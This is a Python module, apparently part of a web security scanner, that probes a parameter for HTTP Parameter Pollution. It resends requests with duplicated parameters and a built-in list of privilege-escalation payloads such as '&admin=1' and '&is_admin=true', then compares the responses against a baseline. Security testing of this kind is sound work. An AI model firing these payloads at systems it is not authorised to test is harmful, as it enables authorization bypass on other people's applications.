#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - HTTP Parameter Pollution Module
Detects HPP vulnerabilities by sending duplicate parameters and
checking for logic bypasses, authorization changes, or behaviour
differences.
"""

from urllib.parse import urlencode, urlparse, parse_qs, urlunparse


from config import Payloads, Colors


class HPPModule:
    """HTTP Parameter Pollution Testing Module"""

    HPP_PAYLOADS = Payloads.HPP_PAYLOADS + [
        '&admin=1', '&is_admin=true', '&privilege=admin',
        '&verified=true', '&approved=1', '&status=active',
    ]

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "HTTP Parameter Pollution"

    def test(self, url: str, method: str, param: str, value: str):
        """Test a parameter for HPP by sending duplicate parameters."""
        # 1. Baseline: normal request
        try:
            baseline_resp = self.requester.request(
                url, method, data={param: value},
            )
            if not baseline_resp:
                return
            baseline_body = baseline_resp.text or ''
            baseline_status = baseline_resp.status_code
        except Exception:
            return

        # 2. Duplicate parameter with different values
        for payload in self.HPP_PAYLOADS:
            try:
                # Build data with duplicate parameter
                if method.upper() == 'GET':
                    # Append duplicate param to query string
                    parsed = urlparse(url)
                    qs = parsed.query
                    dup_qs = f"{qs}&{param}={value}{payload}" if qs else f"{param}={value}{payload}"
                    test_url = urlunparse(parsed._replace(query=dup_qs))
                    response = self.requester.request(test_url, 'GET')
                else:
                    data_str = f"{param}={value}&{param}={value}{payload}"
                    response = self.requester.request(
                        url, method, data=data_str,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    )

                if not response:
                    continue

                # Detect HPP: significant behaviour change
                if self._detect_hpp(baseline_resp, response, payload):
                    from core.engine import Finding
                    finding = Finding(
                        technique="HTTP Parameter Pollution",
                        url=url,
                        param=param,
                        payload=f"{param}={value}{payload}",
                        evidence=self._get_evidence(baseline_resp, response),
                        severity='MEDIUM',
                        confidence=0.7,
                    )
                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'HPP test error: {e}')}")

    def test_url(self, url: str):
        """URL-level HPP test (not applicable)."""
        pass

    def _detect_hpp(self, baseline, response, payload):
        """Check for HPP indicators comparing baseline to test response."""
        # Status code change (e.g. 200 → 302, 403 → 200)
        if baseline.status_code != response.status_code:
            if response.status_code in (200, 301, 302):
                return True

        # Significant body length change (> 20%)
        bl = len(baseline.text or '')
        rl = len(response.text or '')
        if bl > 0 and abs(rl - bl) / bl > 0.2:
            return True

        # Check for privilege-related keywords appearing in the response
        resp_body = (response.text or '').lower()
        base_body = (baseline.text or '').lower()
        priv_keywords = ['admin', 'dashboard', 'authorized', 'welcome', 'success']
        for kw in priv_keywords:
            if kw in resp_body and kw not in base_body:
                return True

        return False

    def _get_evidence(self, baseline, response):
        """Build evidence string from the two responses."""
        parts = [
            f"Baseline status: {baseline.status_code}",
            f"HPP status: {response.status_code}",
            f"Baseline length: {len(baseline.text or '')}",
            f"HPP length: {len(response.text or '')}",
        ]
        return '; '.join(parts)
